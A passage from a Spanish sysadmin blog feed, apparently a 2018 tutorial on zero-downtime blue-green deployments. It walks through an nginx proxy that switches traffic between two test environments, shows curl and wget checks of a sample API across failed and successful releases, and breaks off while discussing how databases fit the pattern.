&lt;p&gt;Y se acabaron las preguntas tontas fuera de contexto.&lt;/p&gt;</content><category term="bash"></category><category term="variable"></category><category term="HOSTALIASES"></category></entry><entry><title>Despliegues sin corte de servicio: blue-green deployments</title><link href="https://www.linuxsysadmin.ml/2018/05/despliegues-sin-corte-de-servicio-blue-green-deployments.html" rel="alternate"></link><published>2018-05-28T10:00:00+02:00</published><updated>2018-05-28T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-28:/2018/05/despliegues-sin-corte-de-servicio-blue-green-deployments.html</id><summary type="html">&lt;p&gt;Para muchas aplicaciones caseras, nos importa poco parar un servidor de aplicaciones o web. Sin embargo, en el mundo empresarial, un corte de servicio o &lt;em&gt;downtime&lt;/em&gt; son palabras mayores, y normalmente vienen seguidos de un papeleo espectacular; otras veces se puede calmar la situación mediante el despido del pobre operador …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Para muchas aplicaciones caseras, nos importa poco parar un servidor de aplicaciones o web. Sin embargo, en el mundo empresarial, un corte de servicio o &lt;em&gt;downtime&lt;/em&gt; son palabras mayores, y normalmente vienen seguidos de un papeleo espectacular; otras veces se puede calmar la situación mediante el despido del pobre operador.&lt;/p&gt;
&lt;p&gt;En un mundo &lt;em&gt;agile&lt;/em&gt; en donde los despliegues son el pan de cada semana, nos interesa minimizar, o incluso suprimir, cualquier mención a la probabilidad de un &lt;em&gt;downtime&lt;/em&gt;. Para esto existe un patrón que se llama &lt;a href="https://martinfowler.com/bliki/BlueGreenDeployment.html"&gt;blue-green deployment&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La idea de fondo es muy simple: tenemos dos entornos iguales llamados &lt;strong&gt;blue&lt;/strong&gt; y &lt;strong&gt;green&lt;/strong&gt;, precedidos con un &lt;em&gt;proxy&lt;/em&gt; o un balanceador que hace fácil dirigir el tráfico hacia uno u otro. Esto significa que podemos modificar uno de los entornos en caliente, sabiendo que &lt;strong&gt;no es producción&lt;/strong&gt;. Solamente cuando el entorno secundario funciona bien podemos dirigir el tráfico hacia él, que &lt;strong&gt;se convierte en producción&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Blue-green deployment" src="https://www.linuxsysadmin.ml/images/blue-green_deployments.jpg"&gt;&lt;/p&gt;
&lt;p&gt;En caso de un error catastrófico no detectado, basta con volver a dirigir el tráfico al entorno anterior, que todavía tenemos funcional. Si no hubieran errores, podremos reinstalar este entorno anterior, en vistas a que pase a ser producción en un futuro cercano. Los montajes más habituales ofrecen ambos entornos, sirviendo dos puntos de entrada: uno como entorno de producción y el otro como entorno de pruebas.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Vamos a exponer una API de ejemplo que no hace nada en especial; es lo de menos en este momento. Vamos a poner dos servidores de aplicaciones por entorno y vamos a hacer balanceo de carga además de la función de dirección de tráfico. Estas son las decisiones de diseño de este ejemplo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tenemos un servidor llamado &lt;em&gt;proxy&lt;/em&gt; que va a ejecutar un &lt;strong&gt;nginx&lt;/strong&gt; como balanceador y &lt;em&gt;switch&lt;/em&gt;, aunque serviría otro (un &lt;strong&gt;haproxy&lt;/strong&gt;, por ejemplo)&lt;/li&gt;
&lt;li&gt;El entorno &lt;strong&gt;blue&lt;/strong&gt; se compone de dos servidores &lt;em&gt;blue1&lt;/em&gt; y &lt;em&gt;blue2&lt;/em&gt; escuchando en el puerto 8080&lt;/li&gt;
&lt;li&gt;El entorno &lt;strong&gt;green&lt;/strong&gt; se compone de dos servidores &lt;em&gt;green1&lt;/em&gt; y &lt;em&gt;green2&lt;/em&gt; escuchando en el puerto 8080&lt;/li&gt;
&lt;li&gt;El puerto 80 del &lt;em&gt;proxy&lt;/em&gt; será producción, y el puerto 8080 del mismo servidor servirá como entorno de pruebas&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;El estado inicial&lt;/h3&gt;
&lt;p&gt;Tenemos una versión 1.0.0 en todos los servidores de aplicaciones. La API de ejemplo que ponemos nos muestra claramente la versión y el servidor que atendió la petición, para mayor claridad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# wget -qO- http://blue1:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://blue2:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://green1:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# wget -qO- http://green2:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Decidimos que el entorno &lt;strong&gt;blue&lt;/strong&gt; es actualmente producción, y por lo tanto, &lt;strong&gt;green&lt;/strong&gt; es el entorno de pruebas. Simplemente necesitamos modificar la configuración del &lt;strong&gt;nginx&lt;/strong&gt; para que apunte cada puerto al entorno que toca, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# cat /etc/nginx/conf.d/api.conf 
upstream blue &lt;span class="o"&gt;{&lt;/span&gt;
    server blue1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server blue2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

upstream green &lt;span class="o"&gt;{&lt;/span&gt;
    server green1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server green2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://blue&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://green&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos el &lt;strong&gt;nginx&lt;/strong&gt; y ya tenemos lo que queríamos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Entorno de producción en el puerto 80, apuntando al entorno &lt;strong&gt;blue&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Entorno de pruebas en el puerto 8080, apuntando al entorno &lt;strong&gt;green&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Un despliegue fallido&lt;/h3&gt;
&lt;p&gt;Desplegamos una nueva versión en el entorno de pruebas, actualmente como entorno &lt;strong&gt;green&lt;/strong&gt;. Eso significa deplegar nueva versión en &lt;em&gt;green1&lt;/em&gt; y en &lt;em&gt;green2&lt;/em&gt;. Como el entorno de producción es &lt;strong&gt;blue&lt;/strong&gt;, cualquier desastre que pase en &lt;strong&gt;green&lt;/strong&gt; no va a afectar a la operativa.&lt;/p&gt;
&lt;p&gt;Tras subir &lt;strong&gt;green&lt;/strong&gt; a la versión 1.1.0, vemos en el &lt;em&gt;endpoint&lt;/em&gt; de pruebas que no funciona:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Errors everywhere...&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Errors everywhere...&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pero no pasa nada; el entorno de producción sigue apuntando a &lt;strong&gt;blue&lt;/strong&gt;, que no hemos modificado y por lo tanto, sigue funcionando con la versión anterior.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.0.0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;blue2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta con no cambiar la configuración del &lt;strong&gt;nginx&lt;/strong&gt; en el servidor &lt;em&gt;proxy&lt;/em&gt; para no exponer el desastre más allá del entorno de pruebas. Si algún manazas hubiera cambiado ya la configuración del &lt;em&gt;proxy&lt;/em&gt;, el &lt;em&gt;rollback&lt;/em&gt; consistiría en modificar de nuevo la configuración del &lt;em&gt;proxy&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Un despliegue con éxito&lt;/h3&gt;
&lt;p&gt;Tras investigar el problema de la nueva versión, se localiza un &lt;em&gt;bug&lt;/em&gt; que causa los errores y se escribe un &lt;em&gt;hotfix&lt;/em&gt;, que se libera como version 1.1.1; supongamos que tenemos éxito.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy:8080/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta con modificar la configuración del &lt;em&gt;proxy&lt;/em&gt; para que producción apunte a &lt;strong&gt;green&lt;/strong&gt;, en donde tenemos la nueva versión estable. En el caso de la configuración expuesta anteriormente, bastaría con cambiar las directivas &lt;code&gt;proxy_pass&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@proxy:~# cat /etc/nginx/conf.d/api.conf 
upstream blue &lt;span class="o"&gt;{&lt;/span&gt;
    server blue1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server blue2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

upstream green &lt;span class="o"&gt;{&lt;/span&gt;
    server green1:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server green2:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://green&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://blue&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@proxy:~# nginx -s reload
&lt;span class="m"&gt;2018&lt;/span&gt;/05/07 &lt;span class="m"&gt;17&lt;/span&gt;:43:26 &lt;span class="o"&gt;[&lt;/span&gt;notice&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;21&lt;/span&gt;&lt;span class="c1"&gt;#21: signal process started&lt;/span&gt;
root@proxy:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puesto que un &lt;em&gt;reload&lt;/em&gt; del &lt;strong&gt;nginx&lt;/strong&gt; no provoca pérdida de paquetes ni de peticiones, solo queda ver que las peticiones del entorno de producción son atendidas en los servidores &lt;em&gt;green1&lt;/em&gt; y &lt;em&gt;green2&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ curl http://proxy/fake/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;200&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Everything is OK&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;1.1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;green2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto, el estado de nuestro servicio ha cambiado; ahora tenemos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Entorno de producción en el puerto 80, apuntando al entorno &lt;strong&gt;green&lt;/strong&gt;, con versión 1.1.1&lt;/li&gt;
&lt;li&gt;Entorno de pruebas en el puerto 8080, apuntando al entorno &lt;strong&gt;blue&lt;/strong&gt;, con versión 1.0.0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Por lo tanto, los nuevos despliegues se harían en el entorno &lt;strong&gt;blue&lt;/strong&gt;, que ha dejado de ser el entorno de producción en favor del entorno &lt;strong&gt;green&lt;/strong&gt;. Como pequeño detalle, sería interesante subir &lt;strong&gt;blue&lt;/strong&gt; a la versión nueva, para tener ambos entornos idénticos, como punto de partida para una posible nueva versión.&lt;/p&gt;
&lt;h2&gt;Y que pasa con las bases de datos?&lt;/h2&gt;
&lt;p&gt;En realidad es un problema que no solo atañe a las bases de datos; otras partes &lt;em&gt;stateful&lt;/em&gt; como sistemas de ficheros, colas y APIs remotas también deben ser tratadas en este caso. Este es un tema que no queda bien reflejado, habiendo dos corrientes enfrentadas que defienden sus puntos de vista:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bases de datos duplicadas&lt;/li&gt;
&lt;li&gt;Bases de datos compartidas&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En caso de duplicar la base de datos en ambos entornos, ganamos la posibilidad de modificarla en nuestros &lt;em&gt;tests&lt;/em&gt;, ya que las pruebas en el entorno de pruebas no van a afectar al entorno de producción. El problema en este punto es que tenemos la necesidad de mantenerlas sincronizadas, pudiendo ser un proceso lento en caso de un conjunto de datos grande.&lt;/p&gt;
